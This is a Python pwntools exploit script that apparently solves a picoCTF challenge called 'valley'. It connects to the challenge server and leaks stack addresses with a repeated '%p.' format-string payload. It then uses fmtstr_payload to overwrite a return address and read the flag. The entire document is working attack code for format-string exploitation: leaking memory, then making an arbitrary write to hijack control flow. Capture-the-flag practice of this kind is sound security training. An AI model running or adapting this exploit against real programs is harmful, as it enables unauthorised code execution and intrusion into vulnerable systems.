from pwn import *

exe = context.binary = ELF('./valley', checksec=False)
target_addr = -0x8
value_to_write = -0x1AA

conn = remote('shape-facility.picoctf.net', 63380)
# conn = process("./valley")

def find_offset():
   print(conn.recvline())
   payload = b'%p.' * 21
   print(payload)
   conn.sendline(payload)
   print(conn.recvline())
   conn.sendline(b"exit")
   print(conn.recvline())

def extract_flag(output):
   tokens=output.split()
   last_token=tokens[-1]
   print(last_token)

def extract_values(line):
   global value_to_write
   global target_addr
   tokens=line.split('.')
   ret=int(tokens[-2],16)
   stack=int(tokens[-3],16)
   value_to_write+=ret
   target_addr+=stack


def set_values():
   payload = b'%p.' * 21
   conn.sendline(payload)
   line=conn.recvline()
   extract_values(str(line))

def send_payload():
   global value_to_write
   global target_addr
   offset = 6
   conn.recvline()
   set_values()
   
   payload = fmtstr_payload(offset, {target_addr: value_to_write},write_size='short')
   
   conn.sendline(payload)
   conn.recvline
   conn.sendline(b"exit")
   output = conn.recvall()
   extract_flag(output)
      
   

send_payload()
# find_offset()